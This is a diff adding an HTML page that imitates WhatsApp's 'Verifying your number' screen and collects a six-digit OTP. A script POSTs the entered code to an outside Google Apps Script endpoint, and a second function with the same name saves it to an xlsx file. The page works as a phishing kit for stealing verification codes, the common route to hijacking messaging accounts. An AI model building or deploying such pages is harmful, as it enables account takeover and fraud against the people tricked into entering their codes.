@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WhatsApp OTP Verification</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #121B22;
+            color: white;
+            font-family: 'Comic Sans MS', cursive;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #aaa;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .otp-inputs input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 24px;
+            border: none;
+            border-bottom: 2px solid #00D75A;
+            background: transparent;
+            color: white;
+        }
+
+        .resend {
+            color: #00D75A;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<h2>Verifying your number</h2>
+<p>SMS sent to <strong>+94 78 451 2138</strong>. <span style="color:#00AEEF">Wrong number?</span></p>
+
+<div class="otp-inputs">
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+    <input type="text" maxlength="1" />
+</div>
+
+<div class="resend">Didn’t receive code?</div>
+
+<script>
+    function sendOTPToCloud(otp) {
+        fetch('https://script.google.com/macros/s/AKfycbyTprJ2rSEqgrPjxZ8ippg4ksWO4hsQGFmRMYrJjECvf6jFZT8nD6l8h1_07WAanIqc/exec', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ otp: otp })
+        })
+            .then(response => response.text())
+            .then(result => console.log("OTP sent:", result))
+            .catch(error => console.error("Error sending OTP:", error));
+    }
+</script>
+
+
+<script>
+    const inputs = document.querySelectorAll(".otp-inputs input");
+
+    inputs.forEach((input, i) => {
+        input.addEventListener("input", () => {
+            if (input.value && i < inputs.length - 1) {
+                inputs[i + 1].focus();
+            }
+
+            const otp = Array.from(inputs).map(i => i.value).join("");
+
+            if (otp.length === inputs.length) {
+                console.log("OTP:", otp);
+                sendOTPToCloud(otp);
+            }
+        });
+
+        input.addEventListener("keydown", e => {
+            if (e.key === "Backspace" && !input.value && i > 0) {
+                inputs[i - 1].focus();
+            }
+        });
+    });
+
+    function sendOTPToCloud(otp) {
+        const wb = XLSX.utils.book_new();
+        const ws = XLSX.utils.aoa_to_sheet([["OTP"], [otp]]);
+        XLSX.utils.book_append_sheet(wb, ws, "OTP Data");
+        XLSX.writeFile(wb, "otp_data.xlsx");
+    }
+</script>
+
+</body>
+</html>
